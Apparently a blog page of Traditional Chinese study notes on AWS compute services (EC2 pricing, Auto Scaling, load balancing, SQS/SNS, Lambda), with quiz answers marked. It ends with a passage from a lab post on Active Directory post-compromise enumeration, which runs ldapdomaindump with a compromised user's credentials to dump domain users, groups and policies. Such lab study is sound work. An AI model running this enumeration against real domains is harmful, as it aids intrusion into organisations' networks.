<h2 id="Amazon-EC2-定價"><a href="#Amazon-EC2-定價" class="headerlink" title="Amazon EC2 定價"></a><strong>Amazon EC2 定價</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Amazon EC2 定價選項</span><br><span class="line">├── 隨需定價</span><br><span class="line">│   ├── 執行個體執行的時間長度付費</span><br><span class="line">│   ├── 適用於不可中斷的短期不定期工作負載</span><br><span class="line">│   ├── 無需預付成本或最低合約</span><br><span class="line">│   ├── 適用於開發、測試應用程式等使用模式無法預測的情況</span><br><span class="line">├── 預留執行個體</span><br><span class="line">│   ├── 標準預留執行個體</span><br><span class="line">│   │   ├── 適用於穩定狀態的應用程式</span><br><span class="line">│   │   ├── 提前承諾一定的用量以獲得折扣</span><br><span class="line">│   │   ├── 可選擇 EC2 執行個體類型、大小、作業系統、租用等</span><br><span class="line">│   ├── 可轉換預留執行個體</span><br><span class="line">│       ├── 適用於需要在不同區域或不同執行個體類型中執行的情況</span><br><span class="line">│       ├── 提供更高折扣並具有更大靈活性</span><br><span class="line">├── EC2 執行個體 Savings Plans</span><br><span class="line">│   ├── 提供折扣，最多可節省72%，需承諾一定的用量和時間</span><br><span class="line">│   ├── 無需指定 EC2 執行個體類型和大小、作業系統和租用</span><br><span class="line">│   ├── 對執行個體系列和區域做出 1 年期或 3 年期的每小時支出承諾，可降低 EC2 執行個體成本</span><br><span class="line">│   ├── 定價方式也適用於 AWS Fargate 和 AWS Lambda 用量</span><br><span class="line">├── Spot 執行個體</span><br><span class="line">│   ├── 適用於彈性或可承受中斷的工作負載</span><br><span class="line">│   ├── 最高可節省 90% 成本，但需承受執行個體可能中斷的風險</span><br><span class="line">│   |   ├── 容量不再可用或 Spot 執行個體的需求增加，個體可能會中斷</span><br><span class="line">├── 專用主機</span><br><span class="line"><span class="code">    ├── 提供完全專用的實體伺服器</span></span><br><span class="line"><span class="code">    ├── 可用於維持授權合規、購買隨需的專用主機和專用主機保留</span></span><br><span class="line"><span class="code">    ├── 專用主機價格最高</span></span><br></pre></td></tr></table></figure>

<h3 id="知識檢測-1"><a href="#知識檢測-1" class="headerlink" title="知識檢測"></a><strong>知識檢測</strong></h3><ol>
<li>您指定多個 EC2 執行個體在一個區域中執行特定作業系統、執行個體系列和大小及租用時，哪個 Amazon EC2 定價選項可提供折扣？</li>
</ol>
<ul>
<li><p><input disabled="" type="checkbox"> 
可轉換預留執行個體</p>
</li>
<li><p><input disabled="" type="checkbox"> 
EC2 執行個體 Savings Plans</p>
</li>
<li><p><input disabled="" type="checkbox"> 
Spot 執行個體</p>
</li>
<li><p><input checked="" disabled="" type="checkbox"> 
標準預留執行個體</p>
<blockquote>
<p>標準預留執行個體要求您指定：</p>
<ul>
<li>執行個體系列和大小</li>
<li>平台說明</li>
<li>租用</li>
<li>區域</li>
</ul>
<p>您指定數量的 EC2 執行個體涵蓋 1 年期或 3 年期</p>
</blockquote>
</li>
</ul>
<p>您對執行個體系列和區域做出 1 年期或 3 年期限的每小時支出承諾時，哪個 Amazon EC2 定價選項可提供折扣？</p>
<ul>
<li><input disabled="" type="checkbox"> 隨需</li>
<li><input checked="" disabled="" type="checkbox"> EC2 執行個體 Savings Plans</li>
<li><input disabled="" type="checkbox"> Spot 執行個體</li>
<li><input disabled="" type="checkbox"> 預留執行個體</li>
</ul>
<h2 id="擴展-Amazon-EC2"><a href="#擴展-Amazon-EC2" class="headerlink" title="擴展 Amazon EC2"></a><strong>擴展 Amazon EC2</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">AWS 的可擴展性和彈性</span><br><span class="line">│</span><br><span class="line">├── 內部部署資料中心的困境</span><br><span class="line">│   ├── 問題: 難以預測需求，容易出現資源閒置或不足的情況</span><br><span class="line">│   ├── 解決方案: AWS 提供的可擴展性和彈性服務</span><br><span class="line">│</span><br><span class="line">├── AWS 的解決方案</span><br><span class="line">│   ├── 可擴展性</span><br><span class="line">│   │   ├── 定義: 根據需求變化自動增減資源，確保足夠的運算容量</span><br><span class="line">│   │   ├── AWS 服務: Amazon EC2 Auto Scaling</span><br><span class="line">│   │   │   ├── 動態調整: 根據實際需求變化自動調整執行個體數量</span><br><span class="line">│   │   │   └── 預測擴展: 根據預測需求自動增減執行個體數量</span><br><span class="line">│   │   │       ├── 加速擴展: 同時使用動態調整和預測擴展</span><br><span class="line">│   │   │</span><br><span class="line">│   ├── 彈性</span><br><span class="line">│       ├── 定義: 建立具有高可用性和容錯能力的系統</span><br><span class="line">│       ├── 方法: 透過解耦和備援來達到</span><br><span class="line">│</span><br><span class="line">└── 關鍵概念</span><br><span class="line"><span class="code">    ├── 可擴展性: 根據實際需求自動調整資源量，確保足夠的運算容量</span></span><br><span class="line"><span class="code">    └── 彈性: 建立高可用性和容錯能力的系統，應對各種潛在問題</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>可擴展性</strong>意味著僅以所需資源開始使用，並且透過設計架構，藉由向外擴展或向內縮減來自動回應需求的變化</li>
<li>只需為所用資源付費，不必擔心運算容量不足，無法滿足客戶需求</li>
<li>Amazon EC2 Auto Scaling 可讓您根據不斷變化的應用程式需求，自動新增或移除 Amazon EC2 執行個體</li>
<li>藉由自動增減所需執行個體，可以維持更高的應用程式可用性</li>
</ul>
<p><img src="/img/AWS12_2.png" alt="Untitled"></p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">應付成長的需求：向上擴展 vs. 水平擴展</span><br><span class="line">│</span><br><span class="line">├── 向上擴展</span><br><span class="line">│   ├── 定義: 為正在執行的電腦提供更多效能</span><br><span class="line">│   ├── 缺點: 增加單一執行個體的效能無法解決客戶需求變化的問題</span><br><span class="line">│</span><br><span class="line">├── 解耦系統的優勢</span><br><span class="line">│   ├── 解釋: 每個執行個體只負責特定的任務，不需增加執行個體來解決單一執行個體負載過大的問題</span><br><span class="line">│   └── 好處: 可根據需求調整每個部分的效能，避免過度佈建</span><br><span class="line">│</span><br><span class="line">└── 水平擴展的解決方案</span><br><span class="line"><span class="code">    ├── Amazon EC2 Auto Scaling</span></span><br><span class="line"><span class="code">    │   ├── 定義: 根據需求自動增減執行個體數量</span></span><br><span class="line"><span class="code">    │   ├── 功能:</span></span><br><span class="line"><span class="code">    │   │   ├── 最小容量: 確保至少有一個執行個體在運行</span></span><br><span class="line"><span class="code">    │   │   ├── 所需容量: 根據需求設定執行個體數量</span></span><br><span class="line"><span class="code">    │   │   └── 最大容量: 設定最大執行個體數量以避免過度擴展</span></span><br><span class="line"><span class="code">    │   └── 優點: 可以動態調整執行個體數量，節省成本並滿足客戶需求</span></span><br><span class="line"><span class="code">    └── 成本效益</span></span><br><span class="line"><span class="code">        └── 優勢: 只需支付實際使用的執行個體，節省成本並提供最佳客戶體驗</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<h2 id="透過-Elastic-Load-Balancing-導引流量"><a href="#透過-Elastic-Load-Balancing-導引流量" class="headerlink" title="透過 Elastic Load Balancing 導引流量"></a><strong>透過 Elastic Load Balancing 導引流量</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">負載平衡器 (Load Balancer)</span><br><span class="line">│</span><br><span class="line">├── 負載平衡器的作用</span><br><span class="line">│   ├── 解釋: 負責將傳入的請求路由到多個執行個體進行處理</span><br><span class="line">│   └── 目的: 確保每個執行個體的工作負載均衡，提高效能和可用性</span><br><span class="line">│</span><br><span class="line">├── 需要負載平衡器的情況</span><br><span class="line">│   ├── 客戶需求不平均: 導致某些執行個體負載過大，而其他閒置</span><br><span class="line">│   ├── 需要將請求路由到正確的執行個體: 解決多個執行個體間的流量路由問題</span><br><span class="line">│   └── 需要高效能、成本效益、高度可用、自動擴展的系統</span><br><span class="line">│</span><br><span class="line">└── Elastic Load Balancing (ELB)</span><br><span class="line"><span class="code">    ├── 定義: AWS 的一項受管服務，自動在多個執行個體之間分配傳入流量</span></span><br><span class="line"><span class="code">    ├── 特性:</span></span><br><span class="line"><span class="code">    │   ├── 高度可用: 在區域層級執行，具備高度可用性，無需額外操作</span></span><br><span class="line"><span class="code">    │   ├── 自動擴展: 可處理額外的輸送量，每小時成本維持不變</span></span><br><span class="line"><span class="code">    │   └── 自動調整: 根據執行個體的動態變化，自動調整負載</span></span><br><span class="line"><span class="code">    ├── 應用場景:</span></span><br><span class="line"><span class="code">    │   ├── 前端流量: 將傳入流量分配到多個前端執行個體中</span></span><br><span class="line"><span class="code">    │   └── 後端通訊: 將流量路由到最少負載的後端執行個體中</span></span><br><span class="line"><span class="code">    └── 重要性: ELB 和 Amazon EC2 Auto Scaling 共同運作，確保應用程式提供高效能和可用性</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<ul>
<li>如果您有多個 Amazon EC2 執行個體，Elastic Load Balancing 會將工作負載分配到多個執行個體，因此單一執行個體無須承載大部分工作負載</li>
<li>雖然 Elastic Load Balancing 和 Amazon EC2 Auto Scaling 各為不同服務，但兩者共同運作時，有助於確保 Amazon EC2 中執行的應用程式能夠提供高效能和可用性。</li>
</ul>
<p><img src="/img/AWS12_3.png" alt="低需求期間"></p>
<p>低需求期間</p>
<p><img src="/img/AWS12_4.png" alt="高需求期間"></p>
<p>高需求期間</p>
<p><img src="/img/AWS12_5.png" alt="Untitled"></p>
<p><img src="/img/AWS12_6.png" alt="Untitled"></p>
<h2 id="訊息與佇列"><a href="#訊息與佇列" class="headerlink" title="訊息與佇列"></a><strong>訊息與佇列</strong></h2><p>重點 1: 訊息與佇列<br>符號: 📩</p>
<ul>
<li>定義: 將訊息放置在緩衝區中，以解耦應用程式元件之間的通訊。</li>
<li>舉例流程: 收銀員點餐 -&gt; 放置訂單到佇列 -&gt; 咖啡師從佇列取得訂單 -&gt; 製作飲料 -&gt; 移除已完成訂單</li>
</ul>
<p>重點 2: 緊湊耦合 vs. 鬆散耦合<br>符號: 🔗 vs. 🔗🔄</p>
<ul>
<li>定義:<ul>
<li>緊湊耦合: 元件之間<strong>耦合緊密</strong>，一個元件的故障可能<strong>影響整個系統</strong>。</li>
<li>鬆散耦合: 元件之間耦合<strong>較鬆散</strong>，一個元件的故障<strong>不會影響整個系統</strong>。</li>
</ul>
</li>
<li>舉例流程:<ul>
<li>緊湊耦合: 應用程式 A 直接傳送訊息給應用程式 B -&gt; B 故障 -&gt; A 開始發生錯誤</li>
<li>鬆散耦合: 訂單放置到佇列 -&gt; 咖啡師取得訂單 -&gt; 製作飲料 -&gt; 移除已完成訂單</li>
</ul>
</li>
</ul>
<p>重點 3: AWS 服務: Amazon Simple Queue Service (SQS)<br>符號: 📨</p>
<ul>
<li>定義: 可在任何軟體元件之間傳送、存放和接收訊息的服務。</li>
<li>舉例流程: 訂單放置到佇列 -&gt; 咖啡師取得訂單 -&gt; 製作飲料 -&gt; 移除已完成訂單</li>
</ul>
<p>重點 4: AWS 服務: Amazon Simple Notification Service (SNS)<br>符號: 📢</p>
<ul>
<li>定義: 透過發布&#x2F;訂閱模型將訊息傳送至服務或通知終端使用者的服務。</li>
<li>舉例流程: 收銀員點餐 -&gt; 放置訂單到佇列 -&gt; 咖啡師取得訂單 -&gt; 製作飲料 -&gt; 移除已完成訂單</li>
</ul>
<p>重點 5: 單體式應用程式 vs. 微型服務<br>符號: ⬛ vs. 🔲</p>
<ul>
<li><p>定義:</p>
<ul>
<li><p>單體式應用程式: 元件之間耦合緊密，一個元件的故障可能導致整個應用程式失效。</p>
<p>  <img src="/img/AWS12_7.png" alt="Untitled"></p>
</li>
<li><p>微型服務: 元件之間耦合較鬆散，一個元件的故障不會影響整個應用程式。</p>
<p>  <img src="/img/AWS12_8.png" alt="Untitled"></p>
</li>
</ul>
</li>
<li><p>舉例流程:</p>
<ul>
<li>單體式應用程式: 元件耦合緊密 -&gt; 故障可能導致整個應用程式失效<ul>
<li>具備緊耦合元件的應用程式，這些元件可能包括資料庫、伺服器、使用者介面、商業邏輯等</li>
</ul>
</li>
<li>微型服務: 元件彼此鬆散耦合 -&gt; 故障不會影響整個應用程式<ul>
<li>服務和元件滿足不同的功能</li>
<li>有兩種服務可促成應用程式的整合：Amazon Simple Notification Service (Amazon SNS) 和 Amazon Simple Queue Service (Amazon SQS)</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">點餐流程 (單體式應用程式)：</span><br><span class="line">客人 -&gt; 收銀員 -&gt; 咖啡師 -&gt; 客人</span><br><span class="line"></span><br><span class="line">點餐流程 (解耦式使用SQS)：</span><br><span class="line">客人 -&gt; 收銀員 -&gt; SQS (佇列) &lt;- 咖啡師 -&gt; 客人</span><br><span class="line"></span><br><span class="line">電子報發布流程 (SNS)：</span><br><span class="line">發布者 -&gt; SNS 主題 -&gt; 訂閱者</span><br><span class="line"></span><br><span class="line">訂單處理流程 (解耦式使用SQS)：</span><br><span class="line">收銀員 -&gt; SQS (佇列) &lt;- 咖啡師</span><br><span class="line"></span><br><span class="line">咖啡店的訂單流程：</span><br><span class="line"></span><br><span class="line">客人 --&gt; 收銀員：點餐</span><br><span class="line">收銀員 --&gt; 佇列：放入訂單</span><br><span class="line">佇列 --&gt; 咖啡師：取得訂單</span><br><span class="line">咖啡師 --&gt; 客人：製作飲料</span><br><span class="line">咖啡師 --&gt; 佇列：完成訂單移除</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="知識檢測-2"><a href="#知識檢測-2" class="headerlink" title="知識檢測"></a><strong>知識檢測</strong></h3><ol>
<li>哪一種 AWS 服務是向訂閱者發布訊息的最佳選擇？</li>
</ol>
<ul>
<li><input disabled="" type="checkbox"> Amazon Simple Queue Service (Amazon SQS)</li>
<li><input disabled="" type="checkbox"> Amazon EC2 Auto Scaling</li>
<li><input checked="" disabled="" type="checkbox"> Amazon Simple Notification Service (Amazon SNS)</li>
<li><input disabled="" type="checkbox"> Elastic Load Balancing</li>
</ul>
<blockquote>
<p>其他回答皆不正確，因為：</p>
<ul>
<li>Amazon Simple Queue Service (Amazon SQS) 是訊息佇列服務，它不會使用涉及 Amazon SNS 的訊息訂閱和主題模型。</li>
<li>Amazon EC2 Auto Scaling 可讓您根據不斷變化的應用程式需求，自動新增或移除 Amazon EC2 執行個體。</li>
<li>Elastic Load Balancing 是一種可將傳入的應用程式流量自動分配到多個資源 (例如 Amazon EC2 執行個體) 的 AWS 服務。</li>
</ul>
</blockquote>
<h2 id="其他運算服務"><a href="#其他運算服務" class="headerlink" title="其他運算服務"></a><strong>其他運算服務</strong></h2><p><img src="/img/AWS12_9.png" alt="Untitled"></p>
<ul>
<li>將程式碼上傳到 Lambda。</li>
<li>將程式碼設定為從事件來源 (例如 AWS 服務、行動應用程式或 HTTP 端點) 觸發。</li>
<li>Lambda 只會在觸發時執行程式碼。</li>
<li>您只需為使用的運算時間支付費用。在前述的影像大小調整範例中，您只需針對上傳新影像時所用的運算時間付費。上傳影像會觸發 Lambda 執行調整影像大小的程式碼。</li>
</ul>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">AWS 運算服務</span><br><span class="line">├─ EC2 (Elastic Compute Cloud)</span><br><span class="line">│    ├─ 靈活、可靠、高度可擴展</span><br><span class="line">│    ├─ 適用於各種使用案例</span><br><span class="line">│    ├─ 需要自行設定和管理執行個體機群</span><br><span class="line">│    └─ 試著託管傳統應用程式且想要完整存取基礎作業系統例如 Linux 或 Windows</span><br><span class="line">├─ 無伺服器運算</span><br><span class="line">│    ├─ Lambda</span><br><span class="line">│    │    ├─ 無需佈建或管理這些伺服器環境，完全不想要管理基礎環境</span><br><span class="line">│    │    ├─ 只需專注於應用程式開發</span><br><span class="line">│    │    ├─ 每次觸發都會自動擴展函數</span><br><span class="line">│    │    └─ 託管短期執行的函數、服務導向或事件導向的應用程式</span><br><span class="line">│    └─ Fargate</span><br><span class="line">│         ├─ 可用於 ECS 或 EKS 的無伺服器運算平台</span><br><span class="line">│         ├─ 想要在 AWS 上執行 Docker 容器型工作負載(選擇工具 (ECS or EKS) -&gt; 選擇平台 (自行管理的EC2 or Fargate代替管理)</span><br><span class="line">│         └─ 不需管理基礎環境，只需專注於應用程式</span><br><span class="line">└─ 容器服務</span><br><span class="line"><span class="code">     ├─ ECS (Elastic Container Service)</span></span><br><span class="line"><span class="code">     │    ├─ 高度擴展的高效能容器管理系統</span></span><br><span class="line"><span class="code">     │    └─ 支援 Docker 容器</span></span><br><span class="line"><span class="code">     ├─ EKS (Elastic Kubernetes Service)</span></span><br><span class="line"><span class="code">     │    ├─ 全受管服務，用於在 AWS 上執行 Kubernetes</span></span><br><span class="line"><span class="code">     │    └─ 支援大規模部署和管理容器化應用程式</span></span><br><span class="line"><span class="code">     └─ 其他容器化服務</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">咖啡廳舉例的流程圖：</span><br><span class="line"></span><br><span class="line">咖啡廳</span><br><span class="line">├─ 顧客進入咖啡廳</span><br><span class="line">│    ├─ 選擇座位</span><br><span class="line">│    │    ├─ 在內用區域</span><br><span class="line">│    │    │    ├─ 選擇桌子</span><br><span class="line">│    │    │    └─ 坐下等待</span><br><span class="line">│    │    └─ 在外帶區域</span><br><span class="line">│    │         ├─ 排隊點餐</span><br><span class="line">│    │         └─ 等待取餐</span><br><span class="line">│    └─ 等待服務員接待</span><br><span class="line">│         ├─ 服務員接待顧客</span><br><span class="line">│         └─ 點餐</span><br><span class="line">└─ 顧客享用咖啡</span><br><span class="line"><span class="code">     ├─ 室內用餐</span></span><br><span class="line"><span class="code">     │    ├─ 服務員送上餐點</span></span><br><span class="line"><span class="code">     │    └─ 顧客享用</span></span><br><span class="line"><span class="code">     └─ 外帶</span></span><br><span class="line"><span class="code">          ├─ 服務員呼叫顧客取餐</span></span><br><span class="line"><span class="code">          └─ 顧客取餐</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<p><strong>無伺服器運算</strong></p>
<p><img src="/img/AWS12_10.png" alt="Untitled"></p>
<ul>
<li>佈建執行個體 (虛擬伺服器)</li>
<li>上傳程式碼</li>
<li>在應用程式執行時繼續管理執行個體</li>
</ul>
<p>試著託管傳統應用程式且想要完整存取基礎作業系統例如 Linux 或 Windows</p>
<h2 id="第二單元總結"><a href="#第二單元總結" class="headerlink" title="第二單元總結"></a>第二單元總結</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">雲端運算</span><br><span class="line">└─ 定義：透過網際網路提供的 IT 資源隨需交付，採實支實付的定價形式</span><br><span class="line"></span><br><span class="line">AWS 服務</span><br><span class="line">├─ EC2 (Elastic Compute Cloud)</span><br><span class="line">│    ├─ 定義：動態啟動及關閉虛擬伺服器</span><br><span class="line">│    ├─ 類別：一般用途、運算最佳化、記憶體最佳化、加速運算、儲存最佳化</span><br><span class="line">│    └─ 擴展：垂直擴展、水平擴展 (使用 Auto Scaling)</span><br><span class="line">├─ 定價模式：隨需選項、Spot 定價、Savings Plans 或預留執行個體</span><br><span class="line">├─ Elastic Load Balancer：將傳入流量分配給 EC2 執行個體</span><br><span class="line">├─ 訊息服務：SQS (Simple Queue Service) 和 SNS (Simple Notification Service)</span><br><span class="line">├─ 容器服務：ECS (Elastic Container Service) 和 EKS (Elastic Kubernetes Service)</span><br><span class="line">├─ 無伺服器運算：AWS Lambda 和 AWS Fargate</span><br><span class="line">└─ Lambda：可直接上傳程式碼並設定觸發條件執行，只在實際執行程式碼時收費</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="單元二測驗"><a href="#單元二測驗" class="headerlink" title="單元二測驗"></a>單元二測驗</h3><ol>
<li>如果您想要將 Amazon EC2 執行個體使用於批次處理工作負載，那麼最好使用哪種 Amazon EC2 執行個體類型？</li>
</ol>
<ul>
<li><input disabled="" type="checkbox"> 一般用途</li>
<li><input disabled="" type="checkbox"> 記憶體最佳化</li>
<li><input checked="" disabled="" type="checkbox"> 運算最佳化</li>
<li><input disabled="" type="checkbox"> 儲存最佳化</li>
</ul>
<blockquote>
<p>其他回答選項皆不正確，因為：</p>
<ul>
<li>一般用途的執行個體會平衡使用計算、記憶體和網路資源。此執行個體系列對於這個案例中的應用程式並非最佳選擇。運算最佳化執行個體比一般用途的執行個體更適合批次處理的工作負載。</li>
<li>記憶體最佳化執行個體較適合需處理記憶體中大型資料集的工作負載，例如高效能資料庫。</li>
<li>儲存最佳化執行個體專為需要對本機儲存體上的大型資料集進行高量連續讀取和寫入存取的工作負載所設計。問題並未指定要處理的資料規模。批次處理的方式為分組處理資料。運算最佳化執行個體非常適合這種類型可從高效能處理器中受益的工作負載。</li>
</ul>
</blockquote>
<ol>
<li>Amazon EC2 預留執行個體的合約長度選項有哪些？(請選取兩個。)</li>
</ol>
<ul>
<li><input checked="" disabled="" type="checkbox"> 1 年</li>
<li><input disabled="" type="checkbox"> 2 年</li>
<li><input checked="" disabled="" type="checkbox"> 3 年</li>
<li><input disabled="" type="checkbox"> 4 年</li>
<li><input disabled="" type="checkbox"> 5 年</li>
</ul>
<blockquote>
<p>預留執行個體需要 1 年或 3 年的承諾。3 年期選項提供更高的折扣。</p>
</blockquote>
<ol>
<li>您的工作負載總共會執行 6 個月，並且可以承受中斷，那麼最具成本效益的 Amazon EC2 購買選項是什麼？</li>
</ol>
<ul>
<li><input disabled="" type="checkbox"> 預留執行個體</li>
<li><input checked="" disabled="" type="checkbox"> Spot 執行個體</li>
<li><input disabled="" type="checkbox"> 專用執行個體</li>
<li><input disabled="" type="checkbox"> 隨需執行個體</li>
</ul>
<blockquote>
<p>其他回答選項皆不正確，因為：</p>
<ul>
<li>預留執行個體需要 1 年或 3 年的合約期。此案例中的工作負載只會執行 6 個月。</li>
<li>在單一客戶專用硬體上的 Virtual Private Cloud (VPC) 中執行的專用執行個體。這個選項比其他在共用硬體執行的選項具有更高成本。</li>
<li>隨需執行個體符合僅執行 6 個月的需求。不過，Spot 執行個體才是最佳選擇，因為它不需要最低合約期，且能夠承受中斷，成本也低於隨需執行個體。</li>
</ul>
</blockquote>
<ol>
<li>哪個程序是 Elastic Load Balancing 的範例？</li>
</ol>
<ul>
<li><input checked="" disabled="" type="checkbox"> 確保沒有任何一個 Amazon EC2 執行個體必須自行執行完整工作負載</li>
<li><input disabled="" type="checkbox"> 在需求低時移除不需要的 Amazon EC2 執行個體</li>
<li><input disabled="" type="checkbox"> 在線上商店的熱門銷售期間新增第二個 Amazon EC2 執行個體</li>
<li><input disabled="" type="checkbox"> 自動調整 Amazon EC2 執行個體的數量，以便滿足需求</li>
</ul>
<blockquote>
<p>Elastic Load Balancing 是一種可在多個資源 (例如 Amazon EC2 執行個體) 之間自動分配傳入應用程式流量的 AWS 服務。這項特性有助於確保沒有任何一個資源會遭過度使用。</p>
<p>其他選項都是 Auto Scaling 的範例。</p>
</blockquote>
<ol>
<li>如果您想要部署和管理容器化的應用程式，您應該使用哪一種服務？</li>
</ol>
<ul>
<li><input disabled="" type="checkbox"> AWS Lambda</li>
<li><input disabled="" type="checkbox"> Amazon Simple Notification Service (Amazon SNS)</li>
<li><input disabled="" type="checkbox"> Amazon Simple Queue Service (Amazon SQS)</li>
<li><input checked="" disabled="" type="checkbox"> Amazon Elastic Kubernetes Service (Amazon EKS)</li>
</ul>
<blockquote>
<p>Amazon EKS 是一項完全受管的 Kubernetes 服務。Kubernetes 是一種開放原始碼軟體，可讓您大規模部署和管理容器化應用程式。</p>
<p>其他回答選項皆不正確，因為：</p>
<ul>
<li>AWS Lambda 這項服務用於讓您無需佈建或管理伺服器就能執行程式碼。</li>
<li>Amazon Simple Queue Service (Amazon SQS) 這項服務用於讓您透過佇列在軟體元件之間傳送、存放和接收訊息。</li>
<li>Amazon Simple Notification Service (Amazon SNS) 是一種發布&#x2F;訂閱服務。使用 Amazon SNS 主題，發布者可將訊息發布給訂閱者。</li>
</ul>
</blockquote>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-Attacking Active Directory Post-Compromise Enumera" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Attacking%20Active%20Directory%20Post-Compromise%20Enumera/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.072Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Attacking%20Active%20Directory%20Post-Compromise%20Enumera/">
        AD - Post Compromise Enumeration
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Attacking-Active-Directory-Post-Compromise-Enumeration"><a href="#Attacking-Active-Directory-Post-Compromise-Enumeration" class="headerlink" title="Attacking Active Directory: Post-Compromise Enumeration"></a>Attacking Active Directory: Post-Compromise Enumeration</h1><ul>
<li>We’ve compromised a user. Now what?</li>
<li>There are a few tools that offer quick, and efficient enumeration<ul>
<li>Bloodhound</li>
<li>Plumhound</li>
<li>Ldapdomaindump</li>
<li>PingCastle</li>
<li>And whatever else your heart desires</li>
</ul>
</li>
</ul>
<h2 id="Domain-Enumeration-with-ldapdomaindump"><a href="#Domain-Enumeration-with-ldapdomaindump" class="headerlink" title="Domain Enumeration with ldapdomaindump"></a><strong>Domain Enumeration with ldapdomaindump</strong></h2><ul>
<li><strong>ldapdomaindump</strong><ul>
<li>IPV6 relay attack and automatically gave us some information</li>
</ul>
</li>
</ul>
<h3 id="LDAP-explain"><a href="#LDAP-explain" class="headerlink" title="LDAP explain"></a>LDAP explain</h3><p>想像你是一個學校的辦公室助理。你有一個很大的文件櫃，裡面有所有學生和老師的資料。每個文件夾都標有名字，裡面放著這個人的各種資料，比如他們的姓名、地址、電話號碼等等。</p>
<p>現在，假設有一天，老師們需要找到所有年齡在 10 到 12 歲之間的學生，以便安排一個校外活動。他們來找你幫忙，而你要做的就是打開文件櫃，查找所有年齡在這個範圍內的學生，然後把他們的名字和相關資料提供給老師們。</p>
<p>在這個例子中，你就像是 LDAP 伺服器，而文件櫃就像是資料庫。LDAP 是一個用於組織和存儲資訊的協議，就像是你在文件櫃中組織和存儲學生和老師的資料一樣。</p>
<p>老師們向你發出了一個查詢，就像他們要找到特定條件下的學生一樣。你根據這個查詢去文件櫃中尋找符合條件的資料，然後提供給他們。LDAP 就是這樣的一個系統，它可以幫助人們快速地查找和訪問存儲在資料庫中的資訊。</p>
<ul>
<li>用於透過 LDAP <strong>收集和解析資訊並以人類可讀格式以及機器可讀的 json 和 csv&#x2F;tsv.&#x2F;greppable 檔案輸出的工具</strong>。</li>
</ul>
<p>LDAPDomainDump是一款透過LDAP實現的活動目錄資訊收集工具。在一個活動目錄網域中，任何認證使用者都可以透過LDAP來取得大量有趣的資訊。因此，在<strong>網路偵查階段的資訊收集</strong>過程中，LDAP就變成了一個非常「有價值」的協定了。</p>
<p>但問題就在於，<strong>一般透過LDAP匯出的資料並非可讀格式</strong>，而ldapdomaindump這款工具正好可以解決這個問題。它可以透過LDAP收集和解析數據，並將其輸出為人類可讀的HTML格式以及機器可讀的JSON和CSV&#x2F;TSV格式。</p>
<p>first make a directory，因為要將dump下來的所有檔案丟到這目錄下，或是 -o 寫上目錄名稱</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# <span class="built_in">mkdir</span> marvel.local                </span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# <span class="built_in">cd</span> marvel.local          </span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[~/marvel.local]</span><br><span class="line">└─# **ldapdomaindump ldaps://192.168.19.140 -u <span class="string">&#x27;MARVEL\fcastle&#x27;</span> -p Password1**</span><br><span class="line">[*] Connecting to host...</span><br><span class="line">[*] Binding to host</span><br><span class="line">[+] Bind OK                                                                                  </span><br><span class="line">[*] Starting domain dump</span><br><span class="line">[+] Domain dump finished</span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[~/marvel.local]</span><br><span class="line">└─# <span class="built_in">ls</span>                                                                    </span><br><span class="line">domain_computers_by_os.html  domain_groups.grep  **domain_policy.html**  domain_trusts.json          domain_users.json</span><br><span class="line">domain_computers.grep        domain_groups.html  domain_policy.json  **domain_users_by_group.html**</span><br><span class="line">**domain_computers.html**        domain_groups.json  domain_trusts.grep  domain_users.grep</span><br><span class="line">domain_computers.json        domain_policy.grep  domain_trusts.html  domain_users.html</span><br></pre></td></tr></table></figure>

<p>開啟檔案查看內容，如果無法用指令開啟firefox，依據錯誤訊息修改群組</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/marvel.local]</span><br><span class="line">└─# firefox domain_users_by_group.html                             </span><br><span class="line">Running Firefox as root <span class="keyword">in</span> a regular user<span class="string">&#x27;s session is not supported.  ($XAUTHORITY is **/home/kali/.Xauthority** which is owned by kali.)</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">┌──(root㉿kali)-[~/marvel.local]</span></span><br><span class="line"><span class="string">└─# **chown -R root:root /home/kali/.Xauthority**      </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">┌──(root㉿kali)-[~/marvel.local]</span></span><br><span class="line"><span class="string">└─# **firefox domain_users_by_group.html**</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/ADEmum_Untitled.png" alt="Untitled"></p>
<p>可以查看到很多訊息，並從中獲取可能洩漏的機敏資訊</p>
<p>1、domain_groups: 目標網域的群組列表</p>
<p>2、domain_users: 目標網域的使用者列表</p>
